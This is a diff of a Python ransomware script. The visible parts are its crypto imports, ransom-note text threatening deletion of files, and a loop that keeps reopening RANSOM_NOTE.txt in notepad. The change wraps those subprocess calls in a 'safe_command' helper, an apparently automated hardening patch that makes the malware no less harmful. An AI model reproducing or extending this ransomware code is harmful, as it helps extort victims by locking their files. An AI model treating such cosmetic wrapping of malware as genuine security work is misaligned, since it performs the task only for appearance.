@@ -14,6 +14,7 @@ from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 import base64
 import threading # used for ransom note and decryption key on dekstop
+from security import safe_command
 
 
 
@@ -175,7 +176,7 @@ Do NOT think that we wont delete your files altogether and throw away the key if
 
     def show_ransom_note(self):
         # Open the ransom note
-        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+        ransom = safe_command.run(subprocess.Popen, ['notepad.exe', 'RANSOM_NOTE.txt'])
         count = 0 # Debugging/Testing
         while True:
             time.sleep(0.1)
@@ -190,7 +191,7 @@ Do NOT think that we wont delete your files altogether and throw away the key if
                 ransom.kill()
                 # Open the ransom note
                 time.sleep(0.1)
-                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+                ransom = safe_command.run(subprocess.Popen, ['notepad.exe', 'RANSOM_NOTE.txt'])
             # sleep for 10 seconds
             time.sleep(10)
             count +=1 
